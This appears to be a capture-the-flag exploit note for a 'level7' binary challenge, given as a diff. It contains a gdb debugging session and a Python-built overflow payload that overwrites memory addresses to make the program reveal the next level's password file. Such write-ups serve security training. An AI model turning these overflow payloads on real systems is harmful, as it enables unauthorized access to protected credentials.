@@ -1,0 +1,50 @@
+echo Coucou > /tmp/exploit.txt
+chmod 777 /tmp/exploit.txt
+(gdb) break *0x80485d0
+(gdb) run x x
+(gdb) info registers 
+eax            0x80486eb        134514411
+ecx            0xbffff913       -1073743597
+edx            0x80486e9        134514409
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff710       0xbffff710
+ebp            0xbffff738       0xbffff738
+esi            0x0      0
+edi            0x0      0
+eip            0x80485d0        0x80485d0 <main+175>
+eflags         0x200246 [ PF ZF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) x/s 0x80486eb
+0x80486eb:       "/home/user/level8/.pass"
+(gdb) set (char[17])*0x80486eb="/tmp/exploit.txt"
+(gdb) x/s 0x80486eb
+0x80486eb:       "/tmp/exploit.txt"
+(gdb) break *0x80485f0
+(gdb) info registers 
+eax            0x8049960        134519136
+ecx            0xb7fda007       -1208115193
+edx            0x804a0e0        134521056
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff710       0xbffff710
+ebp            0xbffff738       0xbffff738
+esi            0x0      0
+edi            0x0      0
+eip            0x80485f0        0x80485f0 <main+207>
+eflags         0x200286 [ PF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) x/s 0x8049960
+0x8049960 <c>:   "Coucou\n"
+
+./level7 \
+    $(python2.7 -c 'print("B"*20 + "\x28\x99\x04\x08")') \
+    $(python2.7 -c 'print("\xf4\x84\x04\x08")')
